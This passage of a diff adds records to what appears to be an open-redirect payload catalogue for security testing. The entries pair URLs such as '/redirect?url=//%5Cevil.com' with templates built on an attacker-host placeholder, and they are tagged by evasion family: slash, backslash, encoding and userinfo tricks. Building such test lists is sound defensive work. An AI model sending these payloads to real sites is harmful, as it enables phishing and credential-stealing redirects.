+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//%2F{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0365",
+      "payload": "/redirect?url=//%5Cevil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "backslash_and_slash_confusion",
+        "percent_or_escape_encoding",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//%5C{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//%5C{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    },
+    {
+      "id": "OR-0366",
+      "payload": "/redirect?url=//@evil.com",
+      "families": [
+        "protocol_relative_or_slash_variation",
+        "userinfo_and_authority_delimiters",
+        "query_or_full_request_context"
+      ],
+      "sources": [
+        "previous_440_wordlist"
+      ],
+      "templated_payload": "/redirect?url=//@{{ATTACKER_HOST}}",
+      "classification_note": "Candidate test input only; not a confirmed bypass.",
+      "record_type": "request_context_template",
+      "review_status": "classified_unverified",
+      "status": "untested",
+      "confidence": "candidate",
+      "triage_note": "Contains endpoint/query/request context; use in request-construction layer, not as a parameter value.",
+      "runtime_value": "/redirect?url=//@{{ATTACKER_HOST}}",
+      "transport_profile": "request-template",
+      "required_placeholders": [
+        "ATTACKER_HOST"
+      ],
+      "unknown_placeholders": []
+    }
+  ]
+}
